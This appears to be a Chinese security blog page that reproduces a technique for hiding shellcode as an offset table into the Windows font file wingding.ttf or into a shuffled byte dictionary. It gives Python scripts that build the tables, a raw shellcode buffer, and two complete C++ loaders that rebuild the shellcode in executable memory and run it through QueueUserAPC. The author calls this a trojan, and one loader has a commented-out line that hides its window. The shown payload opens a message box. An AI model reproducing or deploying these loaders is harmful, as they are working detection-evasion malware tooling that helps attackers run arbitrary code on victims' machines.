# WhiteFile Offset Table Generate Shellcode

## 简介

这篇文章是我还比较菜的时候\(虽然现在也很菜\)，当时看到的时候惊为天人，大概说可以通过计算shellcode需要字符在白文件中的偏移位置，通过记录偏移位置，在不硬编码的情况下还原出shellcode，今天突然想起来，就复现一下。

## 流程

1. 寻找一个全windows都包含且不变的文件\(C:\Windows\Fonts\wingding.ttf\)
2. 遍历文件确认存在全字符\(0x00-0xff\)
3. 计算shellcode在文件内的偏移表
4. 基于偏移表还原shellcode



## 代码

计算偏移表的代码是用py写的，不是专业写算法的，这个计算可能比较low。

```text

dict = open('wingding.ttf','rb+').read();
char =0
for i in range(256):
        for p in range(len(dict)):
                if  ord(chr(dict[p])) == ord(chr(i)):
                        char +=1
                        print(char)
                        break

if char == 256:print("this file has full chars table");
```

![](../.gitbook/assets/image%20%28151%29.png)

通过一段已有的shellcode生成偏移表，我们古典主义脚本小子还是比较喜欢弹个窗。

```text

dict = open('wingding.ttf','rb+').read();

buf =  b""
buf += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += b"\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x53\x46"
buf += b"\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c\x20\x66\x68\x48"
buf += b"\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
buf += b"\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

char=0
offsettable=[];
for i in range(len(buf)):
	for p in range(len(dict)):
		if  ord(chr(dict[p])) == ord(chr(buf[i])):
			offsettable.append(p)
			break

#生成偏移表
if char == len(buf):print("shellcode offset tables generate success");
print(offsettable)

#测试还原shellcode
shellcode=[]
for i in offsettable:
	shellcode.append(dict[i])
```

![](../.gitbook/assets/image%20%28154%29.png)

可以还原出来，现在我们在c++把木马写出来。

```text
#include <stdio.h>
#include <Windows.h>



int main()
{	
	DWORD dwReadSize=0;
	HANDLE hFile = CreateFileA("C:\\Windows\\Fonts\\wingding.ttf", GENERIC_READ, OPEN_EXISTING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwSize = GetFileSize(hFile, NULL);
	PCHAR pDict = (PCHAR)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	PCHAR lpBuffer = (PCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	ReadFile(hFile, pDict, dwSize, &dwReadSize, NULL);

	
	DWORD offsets[] = { 2741, 2231, 2569, 2741, 65, 203, 113, 48, 2899, 2707, 825, 48, 2845, 157, 2473, 2317, 11, 2473, 93, 363, 2473, 93, 282, 2473, 2059, 128, 2473, 2395, 95, 2473, 155, 146, 17, 1783, 2341, 64, 2173, 1, 629, 288, 19, 2215, 2473, 141, 203, 203, 2473, 2053, 83, 2473, 29, 549, 159, 1, 2255, 2473, 547, 1783, 2473, 2179, 95, 1, 2231, 721, 745, 14, 2473, 745, 2473, 1, 160, 48, 288, 48, 557, 135, 573, 645, 557, 65, 358, 2797, 387, 1717, 1, 82, 2231, 113, 80, 227, 203, 549, 2341, 19, 2473, 2179, 203, 1, 2231, 108, 2473, 363, 2089, 2473, 2179, 282, 1, 2231, 2473, 9, 2473, 1, 2315, 211, 12, 203, 282, 78, 2809, 2707, 128, 1885, 263, 211, 2399, 211, 2803, 156, 195, 2107, 421, 176, 2131, 2315, 1041, 288, 288, 288, 211, 2053, 9, 2761, 2395, 2771, 407, 126, 597, 282, 203, 2131, 2315, 195, 288, 288, 288, 211, 2053, 128, 156, 141, 141, 95, 1405, 156, 833, 47, 1915, 157, 156, 2341, 126, 173, 301, 11, 1421, 219, 151, 203, 131, 211, 43, 59, 288, 2149, 9, 211, 2803, 355, 2761, 2647, 2611, 62, 75, 597, 282, 203, 2131, 2315, 123, 288, 288, 288, 156, 221, 159, 63, 95, 156, 78, 110, 173, 209, 156, 62, 173, 126, 126, 48, 1421, 219, 151, 203, 131, 211, 721, 156, 63, 95, 95, 95, 156, 62, 13, 2059, 649, 156, 301, 221, 77, 95, 156, 221, 1903, 95, 108, 156, 31, 173, 141, 141, 48, 2845, 219, 28, 203, 23, 211, 19, 48, 2899, 2131, 13, 2125, 2131, 288, 258, 48, 557, 355, 288, 2149, 128 };
	for (int i = 0; i < sizeof(offsets)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = pDict[offsets[i]];
	}
	

	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
	QueueUserAPC((PAPCFUNC)lpBuffer, hThread, 0);
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hFile);
	return 0;
}
```

可以看到还原出了shellcode。

![](../.gitbook/assets/image%20%28150%29.png)

![](../.gitbook/assets/image%20%28152%29.png)

脚本小子的任务完成了。

## 抽象成算法

这个时候，仔细详细我们真的需要这个作为字符字典的文件么，我们真的需要月亮么\(不好意思串戏了\)，如果我们找不到这也的文件怎么办，其实我们并不是真的需要这样一个字典，而且我确实没有找到从xp-win10不变的文件。

其实我们只是需要一张能作为字典的字符表，这样我们的这个思路就抽象成了凯撒密码算法（略略略），万物基于算法定律呗。

我们把这张替换表硬编码进木马内，就避免作为参照物的文件失效，具体代码如下：

```text
import random

buf =  b""
buf += b"\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

dict = [i for i in range(256)]
random.shuffle(dict)


offsettable=[];
for i in range(len(buf)):
	for p in range(len(dict)):
		if  ord(chr(dict[p])) == ord(chr(buf[i])):
			offsettable.append(p)
			break

#生成偏移表
print("random dict generate success")
print(dict)
if len(offsettable) == len(buf):print("shellcode offset tables generate success");
print(offsettable)

#测试还原shellcode
"""

shellcode=[]
for i in offsettable:
	shellcode.append(dict[i])

"""
```

![](../.gitbook/assets/image%20%28157%29.png)

这样就避免了使用白名单文件作为参考字典，然后把木马也改改,古典主义脚本小子以弹窗为准。

```text
// OffsetTablesShellcode.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//


#include <stdio.h>
#include <Windows.h>
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	//不显示窗口



int main()
{	


	CHAR pDict[] = { 205, 25, 109, 2, 97, 125, 6, 167, 65, 179, 158, 183, 44, 239, 75, 9, 111, 218, 41, 123, 137, 138, 13, 134, 161, 206, 101, 150, 33, 163, 102, 135, 106, 118, 213, 195, 157, 199, 113, 147, 104, 7, 166, 92, 132, 48, 61, 188, 108, 216, 184, 174, 129, 185, 89, 36, 39, 59, 130, 197, 219, 226, 78, 46, 66, 68, 149, 210, 18, 173, 87, 31, 187, 250, 253, 152, 67, 122, 211, 60, 29, 121, 208, 124, 12, 128, 153, 191, 140, 64, 214, 8, 237, 186, 81, 114, 24, 146, 240, 247, 0, 56, 196, 3, 22, 28, 198, 243, 100, 43, 55, 255, 171, 223, 164, 221, 11, 131, 73, 215, 190, 62, 107, 82, 217, 139, 42, 175, 220, 79, 222, 10, 120, 17, 63, 148, 32, 156, 162, 241, 141, 209, 38, 49, 160, 231, 133, 242, 168, 234, 248, 177, 246, 30, 176, 136, 76, 58, 230, 193, 88, 178, 204, 91, 225, 126, 151, 212, 83, 200, 16, 23, 251, 227, 169, 103, 180, 74, 77, 254, 203, 98, 181, 155, 14, 224, 229, 207, 5, 50, 143, 27, 194, 165, 252, 86, 51, 1, 159, 80, 249, 244, 84, 21, 90, 117, 154, 54, 119, 115, 99, 35, 142, 45, 94, 228, 47, 116, 20, 145, 201, 232, 170, 34, 52, 192, 233, 127, 19, 85, 238, 40, 93, 110, 26, 4, 15, 72, 189, 57, 105, 112, 202, 144, 182, 71, 70, 235, 37, 245, 53, 96, 236, 69, 172, 95 };
	DWORD offsets[] = { 194, 221, 58, 100, 100, 100, 251, 20, 186, 143, 225, 108, 125, 199, 45, 125, 123, 84, 125, 123, 218, 125, 95, 231, 236, 11, 177, 142, 143, 111, 254, 79, 4, 83, 3, 12, 136, 159, 187, 22, 197, 37, 61, 147, 123, 70, 125, 123, 170, 125, 177, 79, 125, 156, 133, 132, 173, 237, 197, 141, 94, 125, 54, 136, 197, 78, 125, 118, 96, 173, 157, 118, 125, 224, 125, 197, 90, 143, 111, 254, 159, 187, 22, 197, 37, 101, 185, 205, 152, 103, 5, 150, 57, 5, 55, 205, 215, 160, 125, 160, 55, 197, 78, 30, 125, 84, 14, 125, 160, 105, 197, 78, 125, 235, 125, 197, 82, 20, 65, 55, 55, 163, 163, 4, 54, 204, 94, 111, 185, 255, 255, 204, 125, 68, 247, 140, 232, 40, 233, 26, 217, 100, 40, 208, 240, 233, 240, 202, 40, 156, 208, 142, 41, 111, 34, 143, 60, 168, 168, 168, 168, 168, 221, 121, 100, 100, 100, 178, 16, 77, 240, 48, 48, 4, 216, 250, 63, 45, 136, 231, 70, 240, 233, 108, 16, 208, 209, 136, 62, 202, 136, 207, 63, 143, 57, 136, 202, 95, 240, 108, 26, 233, 217, 216, 110, 63, 45, 57, 136, 95, 33, 157, 143, 143, 63, 45, 18, 136, 48, 240, 122, 26, 136, 245, 26, 210, 122, 16, 100, 40, 157, 195, 81, 7, 111, 34, 168, 168, 32, 103, 168, 168, 32, 199, 221, 93, 100, 100, 100, 216, 195, 143, 207, 178, 210, 16, 217, 26, 77, 14, 178, 246, 132, 8, 202, 246, 70, 205, 250, 143, 233, 94, 205, 181, 253, 205, 54, 213, 253, 202, 118, 208, 189, 240, 65, 81, 209, 205, 81, 94, 95, 217, 45, 199, 181, 14, 38, 77, 30, 14, 123, 189, 250, 208, 241, 196, 240, 255, 77, 209, 204, 100, 199, 40, 70, 20, 198, 106, 111, 34, 20, 106, 168, 40, 100, 3, 40, 44, 168, 168, 168, 70, 168, 195, 40, 247, 229, 63, 57, 111, 34, 27, 32, 131, 255, 168, 168, 168, 168, 195, 40, 213, 6, 96, 19, 111, 34, 146, 225, 205, 218, 40, 155, 228, 100, 100, 40, 65, 98, 250, 185, 111, 34, 129, 205, 164, 221, 177, 100, 100, 100, 32, 89, 40, 100, 170, 100, 100, 40, 100, 100, 89, 100, 168, 40, 160, 114, 168, 186, 111, 34, 39, 168, 168, 20, 145, 70, 40, 100, 136, 100, 100, 168, 195, 40, 68, 27, 20, 61, 111, 34, 146, 225, 217, 187, 125, 41, 197, 35, 146, 225, 205, 186, 160, 35, 255, 221, 227, 111, 111, 111, 143, 239, 189, 63, 143, 207, 101, 63, 101, 63, 143, 189, 239, 100, 72, 98, 182, 138, 195, 32, 100, 168, 111, 34 };
	
	
	PCHAR lpBuffer = (PCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	
		for (int i = 0; i < sizeof(offsets)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = pDict[offsets[i]];
	}
	
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);

	QueueUserAPC((PAPCFUNC)lpBuffer, hThread, 0);
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return 0;
}
```

![](../.gitbook/assets/image%20%28156%29.png)

## LINKS

{% embed url="https://www.freebuf.com/articles/system/190740.html" %}



